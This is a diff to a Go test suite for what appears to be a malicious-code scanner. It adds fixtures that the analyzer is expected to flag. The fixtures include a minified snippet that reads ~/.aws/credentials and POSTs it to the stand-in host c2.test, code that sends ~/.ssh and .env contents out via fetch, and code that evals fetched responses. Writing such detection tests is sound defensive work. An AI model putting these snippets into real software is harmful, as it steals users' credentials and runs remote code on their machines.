@@ -70,6 +70,24 @@ module.exports = { loadSharedConfigFiles, httpRequest };
 `
 )
 
+const (
+	// A minified async function that reads a credential file and posts it.
+	ev1o = `var a=require('path'),b=require('os'),c=require('fs');(async()=>{var d=c.readFileSync(a.join(b.homedir(),'.aws','credentials'));await fetch('https://c2.test/k',{method:'POST',body:d})})();
+`
+	// A test runner that evaluates its arguments next to a fetch.
+	testRunnerProbe = `const http = require('http');
+async function main() {
+  const server = http.createServer((q, s) => s.end('ok'));
+  await new Promise((r) => server.listen(0, r));
+  await fetch('http://127.0.0.1:' + server.address().port);
+  for (const expr of process.argv.slice(2)) {
+    console.log(eval(expr));
+  }
+}
+main();
+`
+)
+
 func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }
 
 // unit returns n characters of base64 with 16 different characters.
@@ -284,6 +302,13 @@ func TestAnalyze(t *testing.T) {
 		{name: "path closed before the directory name", path: "a.js", data: "const f = fs.readFileSync(path.join(a, b), '.ssh');\nfetch(url, { body: f });\n"},
 		{name: "path defined by an arrow function", path: "a.js", data: "const sshDir = () => path.join(os.homedir(), '.ssh');\nfetch(url);\n"},
 		{name: "path defined by a function expression", path: "a.js", data: "const sshDir = function () { return path.join(os.homedir(), '.ssh'); };\nfetch(url);\n"},
+		{name: "path read inside an async arrow function that is called at once", path: "a.js", data: ev1o, want: []string{"EXFIL-001:1"}},
+		{name: "path read inside the callback of map", path: "a.js", data: "const keys = ['config', 'known_hosts'].map((f) => fs.readFileSync(path.join(os.homedir(), '.ssh', f), 'utf8'));\nfetch(url, { method: 'POST', body: JSON.stringify(keys) });\n", want: []string{"EXFIL-001:1"}},
+		{name: "path read inside a one-line async function", path: "a.js", data: "async function steal() { const c = readFileSync(join(homedir(), '.aws', 'credentials'), 'utf8'); await fetch(url, { method: 'POST', body: c }); }\n", want: []string{"EXFIL-001:1"}},
+		{name: "path read inside a promise callback", path: "a.js", data: "Promise.resolve().then(() => fsp.readFile(path.join(os.homedir(), '.aws', 'credentials'), 'utf8')).then((c) => fetch(url, { method: 'POST', body: c }));\n", want: []string{"EXFIL-001:1"}},
+		{name: "path returned by a function with a default", path: "a.js", data: "const f = () => process.env.CRED_FILE || path.join(os.homedir(), '.aws', 'credentials');\nfetch(url);\n"},
+		{name: "path returned from a block", path: "a.js", data: "function f() {\n  return path.join(os.homedir(), '.ssh');\n}\nfetch(url);\n"},
+		{name: "path returned by an arrow function and read elsewhere", path: "a.js", data: "const credsFile = () => path.join(os.homedir(), '.aws', 'credentials');\nfetch(url, { method: 'POST', body: fs.readFileSync(credsFile()) });\n"},
 
 		{name: "response text handed to eval", path: "a.js", data: "fetch(url).then((r) => r.text()).then(eval);\n", want: []string{"EXEC-001:1"}},
 		{name: "response text handed to eval of the global object", path: "a.js", data: "fetch(url).then((r) => r.text()).then(globalThis.eval);\n", want: []string{"EXEC-001:1"}},
@@ -291,6 +316,8 @@ func TestAnalyze(t *testing.T) {
 		{name: "response text handed to eval with optional chaining", path: "a.js", data: "fetch(url)?.then?.(eval);\n", want: []string{"EXEC-001:1"}},
 		{name: "response text evaluated in an arrow callback", path: "a.js", data: "fetch(url).then((r) => r.text()).then((t) => eval(t));\n", want: []string{"EXEC-001:1"}},
 		{name: "response text evaluated in a function callback", path: "a.js", data: "fetch(url)\n  .then(function (r) { return r.text(); })\n  .then(function (t) { eval(t); });\n", want: []string{"EXEC-001:3"}},
+		{name: "eval of a loop variable next to a fetch", path: "run.js", data: testRunnerProbe},
+		{name: "eval of a name that the fetch does not produce", path: "a.js", data: "const r = await fetch(url);\neval(other);\n"},
 		{name: "stream body evaluated at the end of the response", path: "a.js", data: "http.get(url, (res) => {\n  let body = '';\n  res.on('data', (c) => { body += c; });\n  res.on('end', () => eval(body));\n});\n", want: []string{"EXEC-001:4"}},
 		{name: "new Function of a response text", path: "a.js", data: "const r = await fetch(url);\nconst f = new Function(await r.text());\nf();\n", want: []string{"EXEC-001:2"}},
 		{name: "Function of axios data", path: "a.js", data: "const { data } = await axios.get(url);\nFunction(data)();\n", want: []string{"EXEC-001:2"}},
@@ -665,11 +692,13 @@ func TestAnalyzeLimits(t *testing.T) {
 		{name: "payload across a window cut", path: "cut.js", data: strings.Repeat(";", 256<<10-4) + "eval(atob(x));\n", wantRules: []string{"OBF-002:1"}},
 		{name: "1 MB of unclosed calls", path: "eval.js", data: strings.Repeat("eval(", 1<<20/5), wantSkip: protocol.SkipTooLarge},
 		{name: "2 MB blob on one line", path: "blob.js", data: "var x='" + unit(2<<20) + "';\n", wantRules: []string{"OBF-003:1"}},
-		{name: "many copies of an alias", path: "copies.js", data: strings.Repeat("b=h;", 1<<19) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n", wantRules: []string{"EXFIL-001:3"}},
+		{name: "many copies of an alias", path: "copies.js", data: strings.Repeat("b=h;", 1<<17) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n", wantRules: []string{"EXFIL-001:3"}},
 		{name: "900 credential path segments on separate lines", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 900) + "fetch(u);\n", wantRules: rulesAt("EXFIL-001", 801, protocol.MaxFindingsPerRulePerFile)},
 		{name: "1200 credential path segments are more than are checked", path: "paths.js", data: strings.Repeat("join(a, '.ssh');\n", 1200) + "fetch(u);\n", wantSkip: protocol.SkipTooLarge},
-		{name: "300 environment copies, each followed by 4000 assignments", path: "carriers.js", data: strings.Repeat("var e=process.env;\n"+strings.Repeat("x=e;", 4000)+"\n", 300) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n", wantRules: []string{"EXFIL-001:601"}, wantSkip: protocol.SkipTooLarge},
-		{name: "100000 bare dynamic imports before a request", path: "imports.py", data: strings.Repeat("__import__('requests')\n", 100000) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n", wantRules: []string{"EXFIL-001:100001"}, wantSkip: protocol.SkipTooLarge},
+		{name: "40 environment copies, each followed by 1000 assignments", path: "carriers.js", data: strings.Repeat("var e=process.env;\n"+strings.Repeat("x=e;", 1000)+"\n", 40) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n", wantRules: []string{"EXFIL-001:81"}, wantSkip: protocol.SkipTooLarge},
+		{name: "5000 bare dynamic imports before a request", path: "imports.py", data: strings.Repeat("__import__('requests')\n", 5000) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n", wantRules: []string{"EXFIL-001:5001"}, wantSkip: protocol.SkipTooLarge},
+		{name: "4100 dynamic imports of other modules before a request module", path: "imports.py", data: strings.Repeat("m = __import__('os')\n", 4100) + "import requests as r\nr.post(u, data=open('.env').read())\n", wantRules: []string{"EXFIL-001:4102"}},
+		{name: "5000 plain imports of other modules before a request module", path: "imports.py", data: strings.Repeat("import os\n", 5000) + "import requests\ns = requests\ns.post(u, data=open('.env').read())\n", wantRules: []string{"EXFIL-001:5003"}},
 		{name: "many assignments to look back through", path: "assign.py", data: strings.Repeat("a=", 2<<20) + "\nexec(a)\n"},
 	}
 	for _, tt := range tests {
@@ -714,14 +743,14 @@ func TestAnalyzeScalesLinearly(t *testing.T) {
 		{name: "16x longer minified line", path: "big.min.js", build: func(n int) string { return strings.Repeat(minifiedUnit, n/len(minifiedUnit)) + "\n" }, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
 		{name: "16x more blobs", path: "blobs.js", build: func(n int) string { return strings.Repeat("var k = '"+unit(256)+"';\n", n/270) }, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
 		{name: "16x more environment copies", path: "carriers.js", build: func(n int) string {
-			return strings.Repeat("var e=process.env;\n"+strings.Repeat("x=e;", 1000)+"\n", n/4020) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n"
-		}, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
+			return strings.Repeat("var e=process.env;\n"+strings.Repeat("work();\n", 200), n/1620) + "const k = fs.readFileSync('.env');\nfetch(u, { body: k });\n"
+		}, small: 16 << 10, large: 256 << 10, wantMaxRatio: 100},
 		{name: "16x more dynamic imports", path: "imports.py", build: func(n int) string {
 			return strings.Repeat("__import__('requests')\n", n/23) + "x = open('.env').read()\nimport requests\nrequests.post(u, data=x)\n"
-		}, small: 64 << 10, large: 1 << 20, wantMaxRatio: 100},
+		}, small: 4 << 10, large: 64 << 10, wantMaxRatio: 100},
 		{name: "16x more copies of an alias", path: "copies.js", build: func(n int) string {
 			return strings.Repeat("b=h;", n/4) + "\nconst h = require('https');\nconst e = fs.readFileSync('.env');\nh.request(o).end(e);\n"
-		}, small: 128 << 10, large: 2 << 20, wantMaxRatio: 100},
+		}, small: 64 << 10, large: 1 << 20, wantMaxRatio: 100},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
